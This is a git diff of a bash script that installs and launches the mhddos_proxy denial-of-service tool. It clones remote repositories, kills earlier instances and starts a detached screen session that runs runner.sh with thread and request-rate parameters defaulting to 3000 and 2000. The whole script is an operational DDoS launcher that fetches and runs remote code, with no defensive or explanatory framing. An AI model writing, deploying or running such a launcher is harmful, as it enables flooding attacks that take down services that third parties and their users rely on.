@@ -1,8 +1,16 @@
+#!/bin/bash
+
+threads="${1:-3000}"
+rpc="${2:-2000}"
+
+cd ~
+sudo rm -rf auto || true
+git clone https://github.com/girador/auto
+
 #Just in case kill previous copy of mhddos_proxy
 sudo pkill -f runner.sh
 sudo pkill -f runner.py
 sudo pkill -f ./start.py
-
 
 sudo apt update -y
 sudo apt upgrade -y
@@ -29,3 +37,9 @@ sudo rm -r mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd ~/mhddos_proxy
 sudo pip3 install -r requirements.txt
+
+sleep 2m
+
+cd ~/auto
+
+screen -dmS "mhddos" bash runner.sh 1 $threads $rpc
